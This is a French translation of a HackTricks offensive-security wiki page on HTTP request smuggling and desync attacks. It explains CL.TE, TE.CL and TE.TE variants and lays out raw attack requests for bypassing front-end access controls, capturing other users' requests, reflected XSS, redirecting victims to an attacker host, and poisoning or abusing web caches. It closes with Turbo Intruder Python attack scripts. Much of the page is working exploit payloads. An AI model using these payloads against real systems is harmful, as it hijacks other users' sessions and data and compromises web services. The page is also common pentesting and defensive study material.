# Attaque de Smuggling de Requête HTTP / Attaque de Désynchronisation HTTP

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres façons de soutenir HackTricks :

- Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
- Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
- **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
- **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.

</details>

## Qu'est-ce que c'est

Cette vulnérabilité se produit lorsqu'une **désynchronisation** entre les **proxys frontaux** et le **serveur back-end** permet à un **attaquant** d'**envoyer** une **requête HTTP** qui sera **interprétée** comme une **seule requête** par les **proxys frontaux** (équilibrage de charge/proxy inverse) et **comme 2 requêtes** par le **serveur back-end**.\
Cela permet à un utilisateur de **modifier la prochaine requête qui arrive au serveur back-end après la sienne**.

### Théorie

[**Spécification RFC (2161)**](https://tools.ietf.org/html/rfc2616)

> Si un message est reçu avec à la fois un champ d'en-tête Transfer-Encoding et un champ d'en-tête Content-Length, ce dernier DOIT être ignoré.

**Content-Length**

> L'en-tête d'entité Content-Length indique la taille du corps de l'entité, en octets, envoyé au destinataire.

**Transfer-Encoding: chunked**

> L'en-tête Transfer-Encoding spécifie la forme de codage utilisée pour transférer en toute sécurité le corps de la charge utile à l'utilisateur.\
> Chunked signifie que de grandes données sont envoyées sous forme de séries de morceaux.

### Réalité

Le **Front-End** (un équilibreur de charge / Proxy Inverse) **traite** l'en-tête _**content-length**_ ou l'en-tête _**transfer-encoding**_ et le **serveur Back-end** **traite l'autre** provoquant une **désynchronisation** entre les 2 systèmes.\
Cela pourrait être très critique car **un attaquant pourra envoyer une requête** au proxy inverse qui sera **interprétée** par le **serveur back-end comme 2 requêtes différentes**. Le **danger** de cette technique réside dans le fait que le **serveur back-end interprétera la 2ème requête injectée** comme si elle **venait du prochain client** et la **vraie requête** de ce client fera **partie** de la **requête injectée**.

### Particularités

Rappelez-vous qu'en HTTP **un caractère de nouvelle ligne est composé de 2 octets :**

- **Content-Length** : Cet en-tête utilise un **nombre décimal** pour indiquer le **nombre d'octets** du **corps** de la requête. Le corps est censé se terminer par le dernier caractère, **une nouvelle ligne n'est pas nécessaire à la fin de la requête**.
- **Transfer-Encoding** : Cet en-tête utilise dans le **corps** un **nombre hexadécimal** pour indiquer le **nombre d'octets** du **prochain chunk**. Le **chunk** doit se **terminer** par une **nouvelle ligne** mais cette nouvelle ligne **n'est pas comptée** par l'indicateur de longueur. Cette méthode de transfert doit se terminer par un **chunk de taille 0 suivi de 2 nouvelles lignes** : `0`
- **Connection** : D'après mon expérience, il est recommandé d'utiliser **`Connection: keep-alive`** sur la première requête de Smuggling de requête.

## Exemples de Base

Ainsi, les attaques de smuggling de requête impliquent de placer à la fois l'en-tête `Content-Length` et l'en-tête `Transfer-Encoding` dans une seule requête HTTP et de les manipuler de manière à ce que les serveurs frontaux et back-end traitent la requête différemment. La manière exacte dont cela est fait dépend du comportement des deux serveurs :

- **CL.TE** : le serveur frontal utilise l'en-tête `Content-Length` et le serveur back-end utilise l'en-tête `Transfer-Encoding`.
- **TE.CL** : le serveur frontal utilise l'en-tête `Transfer-Encoding` et le serveur back-end utilise l'en-tête `Content-Length`.
- **TE.TE** : les serveurs frontal et back-end prennent en charge tous deux l'en-tête `Transfer-Encoding`, mais l'un des serveurs peut être amené à ne pas le traiter en obfusquant l'en-tête d'une manière ou d'une autre.

### Vulnérabilités CL.TE

Ici, le serveur **frontal** utilise l'en-tête **`Content-Length`** et le serveur **back-end** utilise l'en-tête **`Transfer-Encoding`**. Nous pouvons effectuer une attaque de Smuggling de requête HTTP simple comme suit :

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 30`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /404 HTTP/1.1`\
`Foo: x`

Remarquez comment `Content-Length` indique que la **longueur de la requête est de 30 octets** (_rappelez-vous qu'en HTTP, une nouvelle ligne est de 2 octets_), donc le proxy inverse **enverra la requête complète** au back-end, et le back-end traitera l'en-tête `Transfer-Encoding` laissant `GET /404 HTTP/1.1` comme **début de la prochaine requête** (au fait, la prochaine requête sera ajoutée à `Foo:x<Début de la prochaine requête>`).

### Vulnérabilités TE.CL

Ici, le serveur frontal utilise l'en-tête `Transfer-Encoding` et le serveur back-end utilise l'en-tête `Content-Length`. Nous pouvons effectuer une attaque de Smuggling de requête HTTP simple comme suit :

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 4`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `7b`\ `GET /404 HTTP/1.1`\ `Host: vulnerable-website.com`\ `Content-Type: application/x-www-form-urlencoded`\ `Content-Length: 30`\``\
`x=`\
`0`\
`\`

Dans ce cas, le **proxy inverse** enverra **toute la requête** au **back-end** comme indiqué par le **`Transfer-encoding`**. Mais, le **back-end** va **traiter** seulement le **`7b`** (4 octets) comme indiqué dans le `Content-Length`. Par conséquent, la prochaine requête sera celle commençant par `GET /404 HTTP/1.1`

_Notez que même si l'attaque doit se terminer par un `0`, la requête suivante sera ajoutée comme valeurs supplémentaires du paramètre **x**._\
_Notez également que le Content-Length de la requête intégrée indiquera la longueur de la prochaine requête qui sera ajoutée au paramètre **x**. Si elle est trop petite, seuls quelques octets seront ajoutés, et si elle est trop grande (plus grande que la longueur de la prochaine requête), une erreur sera générée pour la prochaine requête._

### Vulnérabilités TE.TE

Ici, les serveurs frontal et back-end prennent en charge tous deux l'en-tête `Transfer-Encoding`, mais l'un des serveurs peut être amené à ne pas le traiter en obfusquant l'en-tête d'une manière ou d'une autre.\
Il existe potentiellement d'innombrables façons d'obfusquer l'en-tête `Transfer-Encoding`. Par exemple :

`Transfer-Encoding: xchunked`\
``\ `Transfer-Encoding : chunked`\``\
`Transfer-Encoding: chunked`\
`Transfer-Encoding: x`\
``\ `Transfer-Encoding: chunked`\ `Transfer-encoding: x`\``\
`Transfer-Encoding:[tab]chunked`\
``\ `[espace]Transfer-Encoding: chunked`\``\
`X: X[\n]Transfer-Encoding: chunked`\
\`\`\
`Transfer-Encoding`\
`: chunked`

En fonction du serveur (proxy inverse ou de sauvegarde) qui **arrête de traiter** l'en-tête **TE**, vous trouverez une **vulnérabilité CL.TE** ou une **vulnérabilité TE.CL**.

## Trouver le Smuggling de Requête HTTP

### Trouver des vulnérabilités CL.TE en utilisant des techniques de temporisation

Si une application est vulnérable à la variante CL.TE du smuggling de requête, alors l'envoi d'une requête comme celle-ci provoquera souvent un retard de temps :
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
Depuis que le serveur frontal utilise l'en-tête `Content-Length`, il ne transmettra qu'une partie de cette requête, en omettant le `0`. Le serveur arrière utilise l'en-tête `Transfer-Encoding`, traite le premier fragment, puis attend l'arrivée du fragment suivant. Cela entraînera un retard observable.

Parfois, au lieu d'obtenir un délai d'expiration, vous recevez une mauvaise demande 400 de l'hôte final comme dans le scénario suivant, où une charge utile CL.TE est envoyée :

![](<../../.gitbook/assets/image (444).png>)

Et la réponse est une redirection contenant une erreur dans le corps avec même la version de haproxy utilisée :

![](<../../.gitbook/assets/image (443).png>)

### Recherche de vulnérabilités TE.CL en utilisant des techniques de synchronisation

Si une application est vulnérable à la variante TE.CL du détournement de requête, l'envoi d'une requête comme celle-ci provoquera souvent un retard temporel :
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
### Sonder les vulnérabilités de la requête HTTP Smuggling

Une fois que vous avez constaté que les **techniques de synchronisation fonctionnent**, vous devez **sonder** si vous pouvez **modifier les requêtes des autres clients**.\
La manière la plus simple de le faire est d'essayer de corrompre vos propres requêtes, **faire une requête pour `/` renvoyer par exemple un code 404**.\
Dans les [Exemples de base](./#basic-examples), nous avons déjà vu des exemples `CL.TE` et `TE.CL` de comment corrompre une requête de client pour demander `/404` provoquant une réponse 404 lorsque le client demandait une autre ressource.

**Remarques**

Quelques considérations importantes doivent être prises en compte lors de la tentative de confirmation des vulnérabilités de la requête de smuggling via l'interférence avec d'autres requêtes :

* La requête "d'attaque" et la requête "normale" doivent être envoyées au serveur en utilisant des connexions réseau différentes. Envoyer les deux requêtes via la même connexion ne prouvera pas que la vulnérabilité existe.
* La requête "d'attaque" et la requête "normale" doivent utiliser la même URL et les mêmes noms de paramètres, autant que possible. Cela est dû au fait que de nombreuses applications modernes routent les requêtes frontales vers différents serveurs back-end en fonction de l'URL et des paramètres. Utiliser la même URL et les mêmes paramètres augmente la chance que les requêtes soient traitées par le même serveur back-end, ce qui est essentiel pour que l'attaque fonctionne.
* Lors de la vérification de la requête "normale" pour détecter toute interférence de la requête "d'attaque", vous êtes en concurrence avec d'autres requêtes que l'application reçoit en même temps, y compris celles d'autres utilisateurs. Vous devez envoyer la requête "normale" immédiatement après la requête "d'attaque". Si l'application est occupée, vous pourriez avoir besoin de plusieurs tentatives pour confirmer la vulnérabilité.
* Dans certaines applications, le serveur frontal fonctionne comme un équilibreur de charge et transfère les requêtes vers différents systèmes back-end selon un algorithme d'équilibrage de charge. Si vos requêtes "d'attaque" et "normale" sont transférées vers différents systèmes back-end, alors l'attaque échouera. C'est une raison supplémentaire pour laquelle vous pourriez avoir besoin d'essayer plusieurs fois avant de confirmer une vulnérabilité.
* Si votre attaque réussit à interférer avec une requête ultérieure, mais que ce n'était pas la requête "normale" que vous avez envoyée pour détecter l'interférence, cela signifie qu'un autre utilisateur de l'application a été affecté par votre attaque. Si vous continuez le test, cela pourrait avoir un effet perturbateur sur d'autres utilisateurs, et vous devriez faire preuve de prudence.

### Forcer via les en-têtes hop-by-hop

En abusant des en-têtes hop-by-hop, vous pourriez indiquer au proxy de **supprimer l'en-tête Content-Length ou Transfer-Encoding pour qu'une requête HTTP smuggling soit possible à exploiter**.
```
Connection: Content-Length
```
Pour **plus d'informations sur les en-têtes hop-by-hop**, visitez :

{% content-ref url="../abusing-hop-by-hop-headers.md" %}
[abusing-hop-by-hop-headers.md](../abusing-hop-by-hop-headers.md)
{% endcontent-ref %}

## Abus de la manipulation des requêtes HTTP

### Pour contourner les contrôles de sécurité côté front-end

Parfois, les **proxys côté front-end effectueront des vérifications de sécurité**. Vous pouvez les éviter en abusant de la manipulation des requêtes HTTP car vous pourrez **contourner les protections**. Par exemple, dans cet exemple, vous **ne pouvez pas accéder à `/admin` depuis l'extérieur** et le proxy côté front-end vérifie cela, mais ce **proxy ne vérifie pas la requête intégrée** :

**CL.TE**

`POST / HTTP/1.1`\
`Host: acb21fdd1f98c4f180c02944000100b5.web-security-academy.net`\
`Cookie: session=xht3rUYoc83NfuZkuAp8sDxzf0AZIwQr`\
`Connection: keep-alive`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 67`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /admin HTTP/1.1`\
`Host: localhost`\
`Content-Length: 10`\
\`\`\
`x=`

**TE.CL**

`POST / HTTP/1.1`\
`Host: ace71f491f52696180f41ed100d000d4.web-security-academy.net`\
`Cookie: session=Dpll5XYw4hNEu09dGccoTjHlFNx5QY1c`\
`Content-Type: application/x-www-form-urlencoded`\
`Connection: keep-alive`\
`Content-Length: 4`\
`Transfer-Encoding: chunked`\
`2b`\
`GET /admin HTTP/1.1`\
`Host: localhost`\
`a=x`\
`0`\
`\`

### Révéler la réécriture des requêtes côté front-end <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

Dans de nombreuses applications, le **serveur côté front-end effectue une réécriture des requêtes** avant de les transmettre au serveur côté back-end, généralement en ajoutant quelques en-têtes de requête supplémentaires.\
Une chose courante à faire est d'**ajouter à la requête l'en-tête** `X-Forwarded-For: <IP du client>` ou un en-tête similaire pour que le back-end connaisse l'IP du client.\
Parfois, si vous pouvez **trouver quelles nouvelles valeurs sont ajoutées** à la requête, vous pourriez être en mesure de **contourner les protections** et **accéder à des informations/endpoints cachés**.

Pour découvrir comment le proxy réécrit la requête, vous devez **trouver un paramètre POST que le back-end reflétera sa valeur** dans la réponse. Ensuite, utilisez ce paramètre en dernier et utilisez une exploitation comme celle-ci :

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 130`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
`0`\
``\ `POST /search HTTP/1.1`\ `Host: vulnerable-website.com`\ `Content-Type: application/x-www-form-urlencoded`\ `Content-Length: 100`\``\
`search=`

Dans ce cas, la prochaine requête sera ajoutée après `search=`, qui est également **le paramètre dont la valeur va être reflétée** dans la réponse, donc elle va **refléter les en-têtes de la prochaine requête**.

Notez que **seule la longueur indiquée dans l'en-tête `Content-Length` de la requête intégrée va être reflétée**. Si vous utilisez un petit nombre, seuls quelques octets seront reflétés, si vous utilisez un nombre plus grand que la longueur de tous les en-têtes, alors la requête intégrée renverra une erreur. Ensuite, vous devriez **commencer** par un **petit nombre** et **l'augmenter** jusqu'à ce que vous voyiez tout ce que vous vouliez voir.\
Notez également que cette **technique est également exploitable avec une vulnérabilité TE.CL** mais la requête doit se terminer par `search=\r\n0`. Cependant, indépendamment des caractères de nouvelle ligne, les valeurs seront ajoutées au paramètre de recherche.

Enfin, notez que dans cette attaque, nous attaquons toujours nous-mêmes pour apprendre comment le proxy côté front-end réécrit la requête.

### Capturer les requêtes d'autres utilisateurs <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

Si vous trouvez une requête POST qui va enregistrer le contenu de l'un des paramètres, vous pouvez ajouter la requête suivante en tant que valeur de ce paramètre afin de stocker la requête du prochain client :

`POST / HTTP/1.1`\
`Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 319`\
`Connection: keep-alive`\
`Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`POST /post/comment HTTP/1.1`\
`Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net`\
`Content-Length: 659`\
`Content-Type: application/x-www-form-urlencoded`\
`Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi`\
\`\`\
`csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=HACKTRICKS&email=email%40email.com&comment=`

Dans ce cas, la valeur du **paramètre commentaire** va être **enregistrée dans un commentaire** d'un post sur la page qui est **publiquement disponible**, donc un **commentaire apparaîtra avec le contenu de la prochaine requête**.

_Une limitation de cette technique est qu'elle capture généralement des données jusqu'au délimiteur de paramètre applicable pour la requête trafiquée. Pour les soumissions de formulaires encodées en URL, ce sera le caractère `&`, ce qui signifie que le contenu stocké de la requête de l'utilisateur victime se terminera au premier `&`, qui pourrait même apparaître dans la chaîne de requête._

Notez également que cette **technique est également exploitable avec une vulnérabilité TE.CL** mais la requête doit se terminer par `search=\r\n0`. Cependant, indépendamment des caractères de nouvelle ligne, les valeurs seront ajoutées au paramètre de recherche.

### Utilisation de la manipulation des requêtes HTTP pour exploiter les XSS réfléchis

Si la page web est également **vulnérable aux XSS réfléchis**, vous pouvez abuser de la manipulation des requêtes HTTP pour attaquer les clients du web. L'exploitation des XSS réfléchis à partir de la manipulation des requêtes HTTP présente certains avantages :

* **Elle ne nécessite aucune interaction avec les utilisateurs victimes**
* Elle peut être utilisée pour **exploiter** le comportement XSS dans des parties de la requête qui **ne peuvent pas être contrôlées de manière triviale dans une attaque XSS réfléchie normale**, comme les en-têtes de requête HTTP.

Si un site web est vulnérable aux XSS réfléchis sur l'en-tête User-Agent, vous pouvez utiliser cette charge utile pour l'exploiter :

`POST / HTTP/1.1`\
`Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net`\
`User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0`\
`Cookie: session=Ro7YknOtbl3bxURHAAxZz84qj3PSMnSY`\
`Transfer-Encoding: chunked`\
`Connection: keep-alive`\
`Content-Length: 213`\
`Content-Type: application/x-www-form-urlencoded`\
``\ `0`\``\
`GET /post?postId=2 HTTP/1.1`\
`Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net`\
`User-Agent: "><script>alert(1)</script>`\
`Content-Length: 10`\
`Content-Type: application/x-www-form-urlencoded`\
\`\`\
`A=`

### Utilisation de la manipulation des requêtes HTTP pour transformer une redirection sur site en une redirection ouverte <a href="#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect" id="using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect"></a>

De nombreuses applications effectuent des redirections sur site d'une URL à une autre et placent le nom d'hôte de l'en-tête `Host` de la requête dans l'URL de redirection. Un exemple de cela est le comportement par défaut des serveurs web Apache et IIS, où une requête pour un dossier sans barre oblique finale reçoit une redirection vers le même dossier incluant la barre oblique finale :

`GET /home HTTP/1.1`\
`Host: normal-website.com`\
\`\`\
`HTTP/1.1 301 Moved Permanently`\
`Location: https://normal-website.com/home/`

Ce comportement est généralement considéré comme inoffensif, mais il peut être exploité dans une attaque de manipulation des requêtes pour rediriger d'autres utilisateurs vers un domaine externe. Par exemple :

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 54`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /home HTTP/1.1`\
`Host: attacker-website.com`\
`Foo: X`

La requête trafiquée déclenchera une redirection vers le site web de l'attaquant, ce qui affectera la requête du prochain utilisateur traitée par le serveur côté back-end. Par exemple :

`GET /home HTTP/1.1`\
`Host: attacker-website.com`\
`Foo: XGET /scripts/include.js HTTP/1.1`\
`Host: vulnerable-website.com`\
\`\`\
`HTTP/1.1 301 Moved Permanently`\
`Location: https://attacker-website.com/home/`

Ici, la requête de l'utilisateur était pour un fichier JavaScript qui était importé par une page du site web. L'attaquant peut compromettre complètement l'utilisateur victime en renvoyant son propre JavaScript dans la réponse.

### Utilisation de la manipulation des requêtes HTTP pour effectuer un empoisonnement de cache web <a href="#using-http-request-smuggling-to-perform-web-cache-poisoning" id="using-http-request-smuggling-to-perform-web-cache-poisoning"></a>

Si une partie de l'**infrastructure côté front-end effectue la mise en cache du contenu** (généralement pour des raisons de performance), il **pourrait être possible de polluer cette cache en modifiant la réponse du serveur**.

Nous avons déjà vu comment modifier la valeur renvoyée attendue par le serveur vers un 404 (dans les [Exemples de base](./#basic-examples)), de manière similaire, vous pourriez faire en sorte que le serveur renvoie le contenu de /index.html lorsque la requête empoisonnée demande `/static/include.js`. De cette manière, le contenu de `/static/include.js` sera mis en cache avec le contenu de `/index.html`, rendant `/static/include.js` inaccessible aux clients (DoS?).

Remarquez que c'est encore plus intéressant si vous trouvez une **Redirection Ouverte** ou une **redirection sur site vers une redirection ouverte** (dernière section). Parce que, vous pourriez être en mesure de **changer les valeurs de cache** de `/static/include.js` avec celles d'un script contrôlé par vous (créant un **XSS général pour tous les clients** qui essaient de télécharger la nouvelle version de `/static/include.js`).

Dans cet exemple, il sera montré comment vous pouvez exploiter un **empoisonnement de cache + une redirection sur site vers une redirection ouverte** pour modifier le contenu du cache de `/static/include.js` pour **servir du code JS contrôlé** par l'attaquant :

`POST / HTTP/1.1`\
`Host: vulnerable.net`\
`Content-Type: application/x-www-form-urlencoded`\
`Connection: keep-alive`\
`Content-Length: 124`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /post/next?postId=3 HTTP/1.1`\
`Host: attacker.net`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 10`\
\`\`\
`x=1`

Notez comment la requête intégrée demande `/post/next?postId=3`. Cette requête sera redirigée vers `/post?postId=4` et **utilisera la valeur de l'en-tête Host** pour indiquer le domaine. Par conséquent, vous pouvez **modifier l'en-tête Host** pour pointer vers le serveur de l'attaquant et la redirection utilisera ce domaine (**redirection sur site vers une redirection ouverte**).

Ensuite, **après avoir empoisonné le socket**, vous devez envoyer une **requête GET** à \*\*`/static/include.js`\*\*cette requête sera **empoisonnée** par la requête **de redirection sur site vers une redirection ouverte** et **récupérera le contenu du script contrôlé par l'attaquant**.

La prochaine fois que quelqu'un demandera `/static/include.js`, le contenu mis en cache du script de l'attaquant sera servi (XSS général).

### Utilisation de la manipulation des requêtes HTTP pour effectuer une duperie de cache web <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **Quelle est la différence entre l'empoisonnement de cache web et la duperie de cache web ?**
>
> * Dans l'**empoisonnement de cache web**, l'attaquant fait en sorte que l'application stocke un contenu malveillant dans le cache, et ce contenu est servi à partir du cache à d'autres utilisateurs de l'application.
> * Dans la **duperie de cache web**, l'attaquant fait en sorte que l'application stocke un contenu sensible appartenant à un autre utilisateur dans le cache, puis l'attaquant récupère ce contenu du cache.

Dans cette variante, l'attaquant trafique une requête qui renvoie un contenu sensible spécifique à un utilisateur. Par exemple :

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /private/messages HTTP/1.1`\
`Foo: X`

Si le **poison atteint un client qui accédait à un contenu statique** comme `/someimage.png` qui allait être **mis en cache**. Le contenu de `/private/messages` de la victime sera mis en cache dans `/someimage.png` et l'attaquant pourra les voler.\
Notez que l'**attaquant ne sait pas quel contenu statique la victime essayait d'accéder** donc probablement la meilleure façon de tester cela est de réaliser l'attaque, d'attendre quelques secondes et de **charger tous** les contenus statiques et de **rechercher les données privées**.

### Armer la manipulation des requêtes HTTP avec la désynchronisation des réponses HTTP

Avez-vous trouvé une vulnérabilité de manipulation des requêtes HTTP et vous ne savez pas comment l'exploiter. Essayez cette autre méthode d'exploitation :

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

## Scripts Turbo Intruder

### CL.TE

Depuis [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

De : [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## Plus d'informations

![https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

[Image provenant d'ici.](https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104)

## Outils

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): Cet outil est un Fuzzer HTTP basé sur la grammaire utile pour trouver des incohérences étranges de trafic de requêtes.

## Références

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres façons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
